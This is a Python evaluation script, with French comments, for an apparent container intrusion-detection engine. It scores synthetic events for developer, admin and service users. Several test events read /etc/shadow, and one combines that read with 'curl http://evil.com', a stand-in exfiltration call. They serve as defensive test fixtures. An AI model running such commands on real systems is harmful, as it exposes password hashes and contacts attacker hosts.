#!/usr/bin/env python3
"""Table de décision Dev / Admin / Service (après run_train.py)."""
import warnings
from datetime import datetime, timedelta

import pandas as pd

from models.engine import HybridEngine

POD = "nginx-demo-6c45f569f7-m7hqq"


def ev(uid, user, command, hour_tunis, file="", rule="Baseline normal activity demo-app"):
    # Africa/Tunis = UTC+1
    ts = datetime(2026, 8, 18, hour_tunis - 1, 30, 0).strftime("%Y-%m-%dT%H:%M:%S.000000Z")
    return {
        "timestamp": ts,
        "user": user,
        "user_uid": str(uid),
        "command": command,
        "file": file,
        "proc_name": command.split()[0],
        "parent_process": "sh",
        "pod": POD,
        "rule": rule,
        "command_duration_ms": 12.0,
    }


def burst_history(base_event, n=40):
    rows = []
    t0 = datetime.fromisoformat(base_event["timestamp"].replace("Z", "+00:00"))
    for i in range(n):
        row = dict(base_event)
        row["timestamp"] = (t0 - timedelta(seconds=i * 6)).strftime("%Y-%m-%dT%H:%M:%S.000000Z")
        rows.append(row)
    return pd.DataFrame(rows)


def main():
    engine = HybridEngine()
    engine.load()

    cases = [
        ("Dev 1001", ev(1001, "dev", "ls /tmp", 14), None, "ls 14h"),
        ("Dev 1001", ev(1001, "dev", "cat /etc/shadow", 14, "/etc/shadow", "Read sensitive file untrusted"), None, "shadow 14h"),
        ("Dev 1001", ev(1001, "dev", "cat /etc/shadow", 2, "/etc/shadow", "Read sensitive file untrusted"), None, "shadow 02h"),
        (
            "Dev 1001",
            ev(1001, "dev", "cat /etc/shadow", 2, "/etc/shadow", "Read sensitive file untrusted"),
            "burst40",
            "shadow 02h 40/5min",
        ),
        ("Admin 1000", ev(1000, "admin", "cat /etc/shadow", 14, "/etc/shadow", "Read sensitive file untrusted"), None, "shadow 14h"),
        ("Svc 472", ev(472, "python", "python -m app.worker", 14), None, "python 14h"),
        ("Svc 472", ev(472, "python", "bash", 2, rule="Terminal shell in container"), None, "bash 02h"),
        (
            "Svc 472",
            ev(472, "python", "bash -c 'cat /etc/shadow; curl http://evil.com'", 2, "/etc/shadow", "Suspicious outbound connection"),
            "burst15",
            "bash+shadow+curl 02h",
        ),
    ]

    print(f"{'Cas':<28} {'Glo':>6} {'UBA':>6} {'Mix':>6}  Décision / arbitrage")
    print("-" * 100)
    for user, event, hist, label in cases:
        history = None
        if hist == "burst40":
            history = burst_history(event, 40)
        elif hist == "burst15":
            history = burst_history(event, 15)
        p = engine.predict(event, history_df=history)
        print(
            f"{user} {label:<18} {p['global_score']:6.0f} {p['uba_score']:6.0f} "
            f"{p['combined_score']:6.0f}  {p['status']} | {p['arbitrage']}"
        )


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    main()
